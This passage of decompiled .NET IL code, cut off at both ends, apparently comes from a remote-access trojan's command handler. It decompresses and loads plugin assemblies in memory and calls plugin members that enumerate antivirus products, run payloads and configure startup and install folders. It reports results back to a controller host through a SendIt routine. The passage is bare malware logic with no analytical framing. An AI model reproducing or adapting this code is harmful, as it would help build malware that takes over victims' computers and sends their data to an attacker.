      IL_0933:  leave      IL_187f

      IL_0938:  br         IL_11e7

      IL_093d:  ldloc.s    V_108
      IL_093f:  ldloc.s    V_15
      IL_0941:  call       string Q.BasicFunctions::StrToBi(uint8[])
      IL_0946:  ldc.i4.0
      IL_0947:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_094c:  ldc.i4.0
      IL_094d:  bne.un     IL_0a4f

      .try
      {
        IL_0952:  ldc.i4.1
        IL_0953:  newarr     [mscorlib]System.Byte
        IL_0958:  stloc.s    V_109
        IL_095a:  ldloc.s    V_109
        IL_095c:  ldc.i4.0
        IL_095d:  ldc.i4.0
        IL_095e:  stelem.i1
        IL_095f:  ldloc.s    V_109
        IL_0961:  stloc.s    V_50
        IL_0963:  ldloc.1
        IL_0964:  ldc.i4.2
        IL_0965:  ldelem.ref
        IL_0966:  callvirt   instance int32 [mscorlib]System.String::get_Length()
        IL_096b:  ldc.i4.s   10
        IL_096d:  ble.s      IL_09bf

        IL_096f:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
        IL_0974:  stloc.s    V_53
        IL_0976:  ldloc.1
        IL_0977:  ldc.i4.0
        IL_0978:  ldelem.ref
        IL_0979:  ldsfld     string Q.SettingPad::Y
        IL_097e:  ldloc.1
        IL_097f:  ldc.i4.1
        IL_0980:  ldelem.ref
        IL_0981:  ldsfld     string Q.SettingPad::Y
        IL_0986:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
        IL_098b:  callvirt   instance int32 [mscorlib]System.String::get_Length()
        IL_0990:  stloc.s    V_52
        IL_0992:  ldloc.s    V_53
        IL_0994:  ldarg.0
        IL_0995:  ldloc.s    V_52
        IL_0997:  ldarg.0
        IL_0998:  ldlen
        IL_0999:  conv.ovf.i4
        IL_099a:  ldloc.s    V_52
        IL_099c:  sub.ovf
        IL_099d:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                   int32,
                                                                                   int32)
        IL_09a2:  ldloc.s    V_53
        IL_09a4:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
        IL_09a9:  call       uint8[] Q.Accessories::Z(uint8[])
        IL_09ae:  call       uint8[] Q.Accessories::Z(uint8[])
        IL_09b3:  call       uint8[] Q.Accessories::Z(uint8[])
        IL_09b8:  call       uint8[] Q.Accessories::Z(uint8[])
        IL_09bd:  stloc.s    V_50
        IL_09bf:  ldloc.s    V_50
        IL_09c1:  ldsfld     string [mscorlib]System.String::Empty
        IL_09c6:  ldc.i4.1
        IL_09c7:  call       object Q.BasicFunctions::XR(uint8[],
                                                         string,
                                                         bool)
        IL_09cc:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
        IL_09d1:  stloc.s    V_51
        IL_09d3:  ldc.i4.5
        IL_09d4:  newarr     [mscorlib]System.String
        IL_09d9:  stloc.s    V_110
        IL_09db:  ldloc.s    V_110
        IL_09dd:  ldc.i4.0
        IL_09de:  ldloc.s    V_15
        IL_09e0:  call       string Q.BasicFunctions::StrToBi(uint8[])
        IL_09e5:  stelem.ref
        IL_09e6:  ldloc.s    V_110
        IL_09e8:  ldc.i4.1
        IL_09e9:  ldsfld     string Q.SettingPad::Y
        IL_09ee:  stelem.ref
        IL_09ef:  ldloc.s    V_110
        IL_09f1:  ldc.i4.2
        IL_09f2:  ldloc.1
        IL_09f3:  ldc.i4.1
        IL_09f4:  ldelem.ref
        IL_09f5:  stelem.ref
        IL_09f6:  ldloc.s    V_110
        IL_09f8:  ldc.i4.3
        IL_09f9:  ldsfld     string Q.SettingPad::Y
        IL_09fe:  stelem.ref
        IL_09ff:  ldloc.s    V_110
        IL_0a01:  ldc.i4.4
        IL_0a02:  ldloc.s    V_51
        IL_0a04:  ldnull
        IL_0a05:  ldstr      "LoUP"
        IL_0a0a:  ldc.i4.0
        IL_0a0b:  newarr     [mscorlib]System.Object
        IL_0a10:  ldnull
        IL_0a11:  ldnull
        IL_0a12:  ldnull
        IL_0a13:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                          class [mscorlib]System.Type,
                                                                                                                          string,
                                                                                                                          object[],
                                                                                                                          string[],
                                                                                                                          class [mscorlib]System.Type[],
                                                                                                                          bool[])
        IL_0a18:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
        IL_0a1d:  stloc.s    V_111
        IL_0a1f:  ldloca.s   V_111
        IL_0a21:  call       string Q.BasicFunctions::ENB(string&)
        IL_0a26:  stelem.ref
        IL_0a27:  ldloc.s    V_110
        IL_0a29:  call       string [mscorlib]System.String::Concat(string[])
        IL_0a2e:  call       bool Q.BasicFunctions::SendIt(string)
        IL_0a33:  pop
        IL_0a34:  leave.s    IL_0a45

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0a36:  dup
        IL_0a37:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0a3c:  stloc.s    V_54
        IL_0a3e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0a43:  leave.s    IL_0a45

      }  // end handler
      IL_0a45:  leave      IL_187f

      IL_0a4a:  br         IL_11e7

      IL_0a4f:  ldloc.s    V_108
      IL_0a51:  ldloc.s    V_16
      IL_0a53:  call       string Q.BasicFunctions::StrToBi(uint8[])
      IL_0a58:  ldc.i4.0
      IL_0a59:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0a5e:  ldc.i4.0
      IL_0a5f:  bne.un     IL_0bd7

      .try
      {
        IL_0a64:  ldc.i4.1
        IL_0a65:  newarr     [mscorlib]System.Byte
        IL_0a6a:  stloc.s    V_109
        IL_0a6c:  ldloc.s    V_109
        IL_0a6e:  ldc.i4.0
        IL_0a6f:  ldc.i4.0
        IL_0a70:  stelem.i1
        IL_0a71:  ldloc.s    V_109
        IL_0a73:  stloc.s    V_55
        IL_0a75:  ldloc.1
        IL_0a76:  ldc.i4.2
        IL_0a77:  ldelem.ref
        IL_0a78:  callvirt   instance int32 [mscorlib]System.String::get_Length()
        IL_0a7d:  ldc.i4.s   10
        IL_0a7f:  ble.s      IL_0ad1

        IL_0a81:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
        IL_0a86:  stloc.s    V_59
        IL_0a88:  ldloc.1
        IL_0a89:  ldc.i4.0
        IL_0a8a:  ldelem.ref
        IL_0a8b:  ldsfld     string Q.SettingPad::Y
        IL_0a90:  ldloc.1
        IL_0a91:  ldc.i4.1
        IL_0a92:  ldelem.ref
        IL_0a93:  ldsfld     string Q.SettingPad::Y
        IL_0a98:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
        IL_0a9d:  callvirt   instance int32 [mscorlib]System.String::get_Length()
        IL_0aa2:  stloc.s    V_58
        IL_0aa4:  ldloc.s    V_59
        IL_0aa6:  ldarg.0
        IL_0aa7:  ldloc.s    V_58
        IL_0aa9:  ldarg.0
        IL_0aaa:  ldlen
        IL_0aab:  conv.ovf.i4
        IL_0aac:  ldloc.s    V_58
        IL_0aae:  sub.ovf
        IL_0aaf:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                   int32,
                                                                                   int32)
        IL_0ab4:  ldloc.s    V_59
        IL_0ab6:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
        IL_0abb:  call       uint8[] Q.Accessories::Z(uint8[])
        IL_0ac0:  call       uint8[] Q.Accessories::Z(uint8[])
        IL_0ac5:  call       uint8[] Q.Accessories::Z(uint8[])
        IL_0aca:  call       uint8[] Q.Accessories::Z(uint8[])
        IL_0acf:  stloc.s    V_55
        IL_0ad1:  ldloc.s    V_55
        IL_0ad3:  ldsflda    string Q.SettingPad::NH1
        IL_0ad8:  call       string Q.BasicFunctions::DEB(string&)
        IL_0add:  ldc.i4.0
        IL_0ade:  call       object Q.BasicFunctions::XR(uint8[],
                                                         string,
                                                         bool)
        IL_0ae3:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
        IL_0ae8:  stloc.s    V_57
        IL_0aea:  ldloc.s    V_57
        IL_0aec:  ldnull
        IL_0aed:  ldstr      "Ho"
        IL_0af2:  ldc.i4.1
        IL_0af3:  newarr     [mscorlib]System.Object
        IL_0af8:  stloc.s    V_112
        IL_0afa:  ldloc.s    V_112
        IL_0afc:  ldc.i4.0
        IL_0afd:  call       object Q.Network::MH()
        IL_0b02:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
        IL_0b07:  stloc.s    V_111
        IL_0b09:  ldloca.s   V_111
        IL_0b0b:  call       string Q.BasicFunctions::DEB(string&)
        IL_0b10:  stelem.ref
        IL_0b11:  ldloc.s    V_112
        IL_0b13:  ldnull
        IL_0b14:  ldnull
        IL_0b15:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                        class [mscorlib]System.Type,
                                                                                                                        string,
                                                                                                                        object[],
                                                                                                                        string[],
                                                                                                                        class [mscorlib]System.Type[])
        IL_0b1a:  ldloc.s    V_57
        IL_0b1c:  ldnull
        IL_0b1d:  ldstr      "Po"
        IL_0b22:  ldc.i4.1
        IL_0b23:  newarr     [mscorlib]System.Object
        IL_0b28:  stloc.s    V_112
        IL_0b2a:  ldloc.s    V_112
        IL_0b2c:  ldc.i4.0
        IL_0b2d:  ldloc.1
        IL_0b2e:  ldc.i4.1
        IL_0b2f:  ldelem.ref
        IL_0b30:  stelem.ref
        IL_0b31:  ldloc.s    V_112
        IL_0b33:  ldnull
        IL_0b34:  ldnull
        IL_0b35:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                        class [mscorlib]System.Type,
                                                                                                                        string,
                                                                                                                        object[],
                                                                                                                        string[],
                                                                                                                        class [mscorlib]System.Type[])
        IL_0b3a:  ldloc.s    V_57
        IL_0b3c:  ldnull
        IL_0b3d:  ldstr      "VNo"
        IL_0b42:  ldc.i4.1
        IL_0b43:  newarr     [mscorlib]System.Object
        IL_0b48:  stloc.s    V_112
        IL_0b4a:  ldloc.s    V_112
        IL_0b4c:  ldc.i4.0
        IL_0b4d:  ldsfld     string Q.SettingPad::RG
        IL_0b52:  stelem.ref
        IL_0b53:  ldloc.s    V_112
        IL_0b55:  ldnull
        IL_0b56:  ldnull
        IL_0b57:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                        class [mscorlib]System.Type,
                                                                                                                        string,
                                                                                                                        object[],
                                                                                                                        string[],
                                                                                                                        class [mscorlib]System.Type[])
        IL_0b5c:  ldloc.s    V_57
        IL_0b5e:  ldnull
        IL_0b5f:  ldstr      "Ruumm"
        IL_0b64:  ldc.i4.0
        IL_0b65:  newarr     [mscorlib]System.Object
        IL_0b6a:  ldnull
        IL_0b6b:  ldnull
        IL_0b6c:  ldnull
        IL_0b6d:  ldc.i4.1
        IL_0b6e:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                           class [mscorlib]System.Type,
                                                                                                                           string,
                                                                                                                           object[],
                                                                                                                           string[],
                                                                                                                           class [mscorlib]System.Type[],
                                                                                                                           bool[],
                                                                                                                           bool)
        IL_0b73:  pop
        IL_0b74:  ldc.i4.5
        IL_0b75:  newarr     [mscorlib]System.Byte
        IL_0b7a:  stloc.s    V_128
        IL_0b7c:  ldloc.s    V_128
        IL_0b7e:  ldc.i4.0
        IL_0b7f:  ldc.i4.s   82
        IL_0b81:  stelem.i1
        IL_0b82:  ldloc.s    V_128
        IL_0b84:  ldc.i4.1
        IL_0b85:  ldc.i4.s   101
        IL_0b87:  stelem.i1
        IL_0b88:  ldloc.s    V_128
        IL_0b8a:  ldc.i4.2
        IL_0b8b:  ldc.i4.s   97
        IL_0b8d:  stelem.i1
        IL_0b8e:  ldloc.s    V_128
        IL_0b90:  ldc.i4.3
        IL_0b91:  ldc.i4.s   100
        IL_0b93:  stelem.i1
        IL_0b94:  ldloc.s    V_128
        IL_0b96:  ldc.i4.4
        IL_0b97:  ldc.i4.s   121
        IL_0b99:  stelem.i1
        IL_0b9a:  ldloc.s    V_128
        IL_0b9c:  stloc.s    V_56
        IL_0b9e:  ldloc.s    V_16
        IL_0ba0:  call       string Q.BasicFunctions::StrToBi(uint8[])
        IL_0ba5:  ldsfld     string Q.SettingPad::Y
        IL_0baa:  ldloc.s    V_56
        IL_0bac:  call       string Q.BasicFunctions::StrToBi(uint8[])
        IL_0bb1:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_0bb6:  call       bool Q.BasicFunctions::SendIt(string)
        IL_0bbb:  pop
        IL_0bbc:  leave.s    IL_0bcd

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0bbe:  dup
        IL_0bbf:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0bc4:  stloc.s    V_60
        IL_0bc6:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0bcb:  leave.s    IL_0bcd

      }  // end handler
      IL_0bcd:  leave      IL_187f

      IL_0bd2:  br         IL_11e7

      IL_0bd7:  ldloc.s    V_108
      IL_0bd9:  ldloc.s    V_17
      IL_0bdb:  call       string Q.BasicFunctions::StrToBi(uint8[])
      IL_0be0:  ldc.i4.0
      IL_0be1:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0be6:  ldc.i4.0
      IL_0be7:  bne.un     IL_0ce2

      .try
      {
        IL_0bec:  ldc.i4.1
        IL_0bed:  newarr     [mscorlib]System.Byte
        IL_0bf2:  stloc.s    V_109
        IL_0bf4:  ldloc.s    V_109
        IL_0bf6:  ldc.i4.0
        IL_0bf7:  ldc.i4.0
        IL_0bf8:  stelem.i1
        IL_0bf9:  ldloc.s    V_109
        IL_0bfb:  stloc.s    V_61
        IL_0bfd:  ldloc.1
        IL_0bfe:  ldc.i4.2
        IL_0bff:  ldelem.ref
        IL_0c00:  callvirt   instance int32 [mscorlib]System.String::get_Length()
        IL_0c05:  ldc.i4.s   10
        IL_0c07:  ble.s      IL_0c59

        IL_0c09:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
        IL_0c0e:  stloc.s    V_66
        IL_0c10:  ldloc.1
        IL_0c11:  ldc.i4.0
        IL_0c12:  ldelem.ref
        IL_0c13:  ldsfld     string Q.SettingPad::Y
        IL_0c18:  ldloc.1
        IL_0c19:  ldc.i4.1
        IL_0c1a:  ldelem.ref
        IL_0c1b:  ldsfld     string Q.SettingPad::Y
        IL_0c20:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
        IL_0c25:  callvirt   instance int32 [mscorlib]System.String::get_Length()
        IL_0c2a:  stloc.s    V_65
        IL_0c2c:  ldloc.s    V_66
        IL_0c2e:  ldarg.0
        IL_0c2f:  ldloc.s    V_65
        IL_0c31:  ldarg.0
        IL_0c32:  ldlen
        IL_0c33:  conv.ovf.i4
        IL_0c34:  ldloc.s    V_65
        IL_0c36:  sub.ovf
        IL_0c37:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                   int32,
                                                                                   int32)
        IL_0c3c:  ldloc.s    V_66
        IL_0c3e:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
        IL_0c43:  call       uint8[] Q.Accessories::Z(uint8[])
        IL_0c48:  call       uint8[] Q.Accessories::Z(uint8[])
        IL_0c4d:  call       uint8[] Q.Accessories::Z(uint8[])
        IL_0c52:  call       uint8[] Q.Accessories::Z(uint8[])
        IL_0c57:  stloc.s    V_61
        IL_0c59:  ldloc.s    V_61
        IL_0c5b:  ldsfld     string [mscorlib]System.String::Empty
        IL_0c60:  ldc.i4.1
        IL_0c61:  call       object Q.BasicFunctions::XR(uint8[],
                                                         string,
                                                         bool)
        IL_0c66:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
        IL_0c6b:  stloc.s    V_63
        IL_0c6d:  ldloc.s    V_63
        IL_0c6f:  ldnull
        IL_0c70:  ldstr      "antiV"
        IL_0c75:  ldc.i4.0
        IL_0c76:  newarr     [mscorlib]System.Object
        IL_0c7b:  ldnull
        IL_0c7c:  ldnull
        IL_0c7d:  ldnull
        IL_0c7e:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                          class [mscorlib]System.Type,
                                                                                                                          string,
                                                                                                                          object[],
                                                                                                                          string[],
                                                                                                                          class [mscorlib]System.Type[],
                                                                                                                          bool[])
        IL_0c83:  castclass  [mscorlib]System.String
        IL_0c88:  stloc.s    V_64
        IL_0c8a:  ldc.i4.4
        IL_0c8b:  newarr     [mscorlib]System.Byte
        IL_0c90:  stloc.s    V_128
        IL_0c92:  ldloc.s    V_128
        IL_0c94:  ldc.i4.0
        IL_0c95:  ldc.i4.s   97
        IL_0c97:  stelem.i1
        IL_0c98:  ldloc.s    V_128
        IL_0c9a:  ldc.i4.1
        IL_0c9b:  ldc.i4.s   110
        IL_0c9d:  stelem.i1
        IL_0c9e:  ldloc.s    V_128
        IL_0ca0:  ldc.i4.2
        IL_0ca1:  ldc.i4.s   105
        IL_0ca3:  stelem.i1
        IL_0ca4:  ldloc.s    V_128
        IL_0ca6:  ldc.i4.3
        IL_0ca7:  ldc.i4.s   49
        IL_0ca9:  stelem.i1
        IL_0caa:  ldloc.s    V_128
        IL_0cac:  stloc.s    V_62
        IL_0cae:  ldloc.s    V_62
        IL_0cb0:  call       string Q.BasicFunctions::StrToBi(uint8[])
        IL_0cb5:  ldsfld     string Q.SettingPad::Y
        IL_0cba:  ldloc.s    V_64
        IL_0cbc:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_0cc1:  call       bool Q.BasicFunctions::SendIt(string)
        IL_0cc6:  pop
        IL_0cc7:  leave.s    IL_0cd8

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0cc9:  dup
        IL_0cca:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0ccf:  stloc.s    V_67
        IL_0cd1:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0cd6:  leave.s    IL_0cd8

      }  // end handler
      IL_0cd8:  leave      IL_187f

      IL_0cdd:  br         IL_11e7

      IL_0ce2:  ldloc.s    V_108
      IL_0ce4:  ldloc.s    V_18
      IL_0ce6:  call       string Q.BasicFunctions::StrToBi(uint8[])
      IL_0ceb:  ldc.i4.0
      IL_0cec:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0cf1:  ldc.i4.0
      IL_0cf2:  bne.un     IL_0eb8

      .try
      {
        IL_0cf7:  ldc.i4.1
        IL_0cf8:  newarr     [mscorlib]System.Byte
        IL_0cfd:  stloc.s    V_109
        IL_0cff:  ldloc.s    V_109
        IL_0d01:  ldc.i4.0
        IL_0d02:  ldc.i4.0
        IL_0d03:  stelem.i1
        IL_0d04:  ldloc.s    V_109
        IL_0d06:  stloc.s    V_68
        IL_0d08:  ldloc.1
        IL_0d09:  ldc.i4.2
        IL_0d0a:  ldelem.ref
        IL_0d0b:  callvirt   instance int32 [mscorlib]System.String::get_Length()
        IL_0d10:  ldc.i4.s   10
        IL_0d12:  ble.s      IL_0d64

        IL_0d14:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
        IL_0d19:  stloc.s    V_73
        IL_0d1b:  ldloc.1
        IL_0d1c:  ldc.i4.0
        IL_0d1d:  ldelem.ref
        IL_0d1e:  ldsfld     string Q.SettingPad::Y
        IL_0d23:  ldloc.1
        IL_0d24:  ldc.i4.1
        IL_0d25:  ldelem.ref
        IL_0d26:  ldsfld     string Q.SettingPad::Y
        IL_0d2b:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
        IL_0d30:  callvirt   instance int32 [mscorlib]System.String::get_Length()
        IL_0d35:  stloc.s    V_72
        IL_0d37:  ldloc.s    V_73
        IL_0d39:  ldarg.0
        IL_0d3a:  ldloc.s    V_72
        IL_0d3c:  ldarg.0
        IL_0d3d:  ldlen
        IL_0d3e:  conv.ovf.i4
        IL_0d3f:  ldloc.s    V_72
        IL_0d41:  sub.ovf
        IL_0d42:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                   int32,
                                                                                   int32)
        IL_0d47:  ldloc.s    V_73
        IL_0d49:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
        IL_0d4e:  call       uint8[] Q.Accessories::Z(uint8[])
        IL_0d53:  call       uint8[] Q.Accessories::Z(uint8[])
        IL_0d58:  call       uint8[] Q.Accessories::Z(uint8[])
        IL_0d5d:  call       uint8[] Q.Accessories::Z(uint8[])
        IL_0d62:  stloc.s    V_68
        IL_0d64:  ldloc.s    V_68
        IL_0d66:  ldsfld     string [mscorlib]System.String::Empty
        IL_0d6b:  ldc.i4.1
        IL_0d6c:  call       object Q.BasicFunctions::XR(uint8[],
                                                         string,
                                                         bool)
        IL_0d71:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
        IL_0d76:  stloc.s    V_70
        IL_0d78:  ldloc.s    V_70
        IL_0d7a:  ldnull
        IL_0d7b:  ldstr      "Sti"
        IL_0d80:  ldc.i4.1
        IL_0d81:  newarr     [mscorlib]System.Object
        IL_0d86:  stloc.s    V_112
        IL_0d88:  ldloc.s    V_112
        IL_0d8a:  ldc.i4.0
        IL_0d8b:  ldsfld     string Q.SettingPad::Sti
        IL_0d90:  stelem.ref
        IL_0d91:  ldloc.s    V_112
        IL_0d93:  ldnull
        IL_0d94:  ldnull
        IL_0d95:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                        class [mscorlib]System.Type,
                                                                                                                        string,
                                                                                                                        object[],
                                                                                                                        string[],
                                                                                                                        class [mscorlib]System.Type[])
        IL_0d9a:  ldloc.s    V_70
        IL_0d9c:  ldnull
        IL_0d9d:  ldstr      "Stu"
        IL_0da2:  ldc.i4.1
        IL_0da3:  newarr     [mscorlib]System.Object
        IL_0da8:  stloc.s    V_112
        IL_0daa:  ldloc.s    V_112
        IL_0dac:  ldc.i4.0
        IL_0dad:  ldsfld     string Q.Loader::Stu
        IL_0db2:  stelem.ref
        IL_0db3:  ldloc.s    V_112
        IL_0db5:  ldnull
        IL_0db6:  ldnull
        IL_0db7:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                        class [mscorlib]System.Type,
                                                                                                                        string,
                                                                                                                        object[],
                                                                                                                        string[],
                                                                                                                        class [mscorlib]System.Type[])
        IL_0dbc:  ldloc.s    V_70
        IL_0dbe:  ldnull
        IL_0dbf:  ldstr      "VN"
        IL_0dc4:  ldc.i4.1
        IL_0dc5:  newarr     [mscorlib]System.Object
        IL_0dca:  stloc.s    V_112
        IL_0dcc:  ldloc.s    V_112
        IL_0dce:  ldc.i4.0
        IL_0dcf:  ldsfld     string Q.SettingPad::VN
        IL_0dd4:  stelem.ref
        IL_0dd5:  ldloc.s    V_112
        IL_0dd7:  ldnull
        IL_0dd8:  ldnull
        IL_0dd9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                        class [mscorlib]System.Type,
                                                                                                                        string,
                                                                                                                        object[],
                                                                                                                        string[],
                                                                                                                        class [mscorlib]System.Type[])
        IL_0dde:  ldloc.s    V_70
        IL_0de0:  ldnull
        IL_0de1:  ldstr      "Fol"
        IL_0de6:  ldc.i4.1
        IL_0de7:  newarr     [mscorlib]System.Object
        IL_0dec:  stloc.s    V_112
        IL_0dee:  ldloc.s    V_112
        IL_0df0:  ldc.i4.0
        IL_0df1:  ldsfld     string Q.SettingPad::Fol
        IL_0df6:  stelem.ref
        IL_0df7:  ldloc.s    V_112
        IL_0df9:  ldnull
        IL_0dfa:  ldnull
        IL_0dfb:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                        class [mscorlib]System.Type,
                                                                                                                        string,
                                                                                                                        object[],
                                                                                                                        string[],
                                                                                                                        class [mscorlib]System.Type[])
        IL_0e00:  ldloc.s    V_70
        IL_0e02:  ldnull
        IL_0e03:  ldstr      "DR"
        IL_0e08:  ldc.i4.1
        IL_0e09:  newarr     [mscorlib]System.Object
        IL_0e0e:  stloc.s    V_112
        IL_0e10:  ldloc.s    V_112
        IL_0e12:  ldc.i4.0
        IL_0e13:  ldsfld     string Q.SettingPad::DR
        IL_0e18:  stelem.ref
        IL_0e19:  ldloc.s    V_112
        IL_0e1b:  ldnull
        IL_0e1c:  ldnull
        IL_0e1d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                        class [mscorlib]System.Type,
                                                                                                                        string,
                                                                                                                        object[],
                                                                                                                        string[],
                                                                                                                        class [mscorlib]System.Type[])
        IL_0e22:  ldloc.s    V_70
        IL_0e24:  ldnull
        IL_0e25:  ldstr      "LoUPi"
        IL_0e2a:  ldc.i4.0
        IL_0e2b:  newarr     [mscorlib]System.Object
        IL_0e30:  ldnull
        IL_0e31:  ldnull
        IL_0e32:  ldnull
        IL_0e33:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                          class [mscorlib]System.Type,
                                                                                                                          string,
                                                                                                                          object[],
                                                                                                                          string[],
                                                                                                                          class [mscorlib]System.Type[],
                                                                                                                          bool[])
        IL_0e38:  castclass  [mscorlib]System.String
        IL_0e3d:  stloc.s    V_71
        IL_0e3f:  ldc.i4.s   10
        IL_0e41:  newarr     [mscorlib]System.Byte
        IL_0e46:  stloc.s    V_128
        IL_0e48:  ldloc.s    V_128
        IL_0e4a:  ldc.i4.0
        IL_0e4b:  ldc.i4.s   76
        IL_0e4d:  stelem.i1
        IL_0e4e:  ldloc.s    V_128
        IL_0e50:  ldc.i4.1
        IL_0e51:  ldc.i4.s   105
        IL_0e53:  stelem.i1
        IL_0e54:  ldloc.s    V_128
        IL_0e56:  ldc.i4.2
        IL_0e57:  ldc.i4.s   115
        IL_0e59:  stelem.i1
        IL_0e5a:  ldloc.s    V_128
        IL_0e5c:  ldc.i4.3
        IL_0e5d:  ldc.i4.s   116
        IL_0e5f:  stelem.i1
        IL_0e60:  ldloc.s    V_128
        IL_0e62:  ldc.i4.4
        IL_0e63:  ldc.i4.s   86
        IL_0e65:  stelem.i1
        IL_0e66:  ldloc.s    V_128
        IL_0e68:  ldc.i4.5
        IL_0e69:  ldc.i4.s   66
        IL_0e6b:  stelem.i1
        IL_0e6c:  ldloc.s    V_128
        IL_0e6e:  ldc.i4.6
        IL_0e6f:  ldc.i4.s   105
        IL_0e71:  stelem.i1
        IL_0e72:  ldloc.s    V_128
        IL_0e74:  ldc.i4.7
        IL_0e75:  ldc.i4.s   101
        IL_0e77:  stelem.i1
        IL_0e78:  ldloc.s    V_128
        IL_0e7a:  ldc.i4.8
        IL_0e7b:  ldc.i4.s   119
        IL_0e7d:  stelem.i1
        IL_0e7e:  ldloc.s    V_128
        IL_0e80:  ldc.i4.s   9
        IL_0e82:  ldc.i4.s   48
        IL_0e84:  stelem.i1
        IL_0e85:  ldloc.s    V_128
        IL_0e87:  stloc.s    V_69
        IL_0e89:  ldloc.s    V_69
        IL_0e8b:  call       string Q.BasicFunctions::StrToBi(uint8[])
        IL_0e90:  ldsfld     string Q.SettingPad::Y
        IL_0e95:  ldloc.s    V_71
        IL_0e97:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_0e9c:  call       bool Q.BasicFunctions::SendIt(string)
        IL_0ea1:  pop
        IL_0ea2:  leave.s    IL_0eb3

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0ea4:  dup
        IL_0ea5:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0eaa:  stloc.s    V_74
        IL_0eac:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0eb1:  leave.s    IL_0eb3

      }  // end handler
      IL_0eb3:  br         IL_11e7

      IL_0eb8:  ldloc.s    V_108
      IL_0eba:  ldloc.s    V_19
      IL_0ebc:  call       string Q.BasicFunctions::StrToBi(uint8[])
      IL_0ec1:  ldc.i4.0
      IL_0ec2:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0ec7:  ldc.i4.0
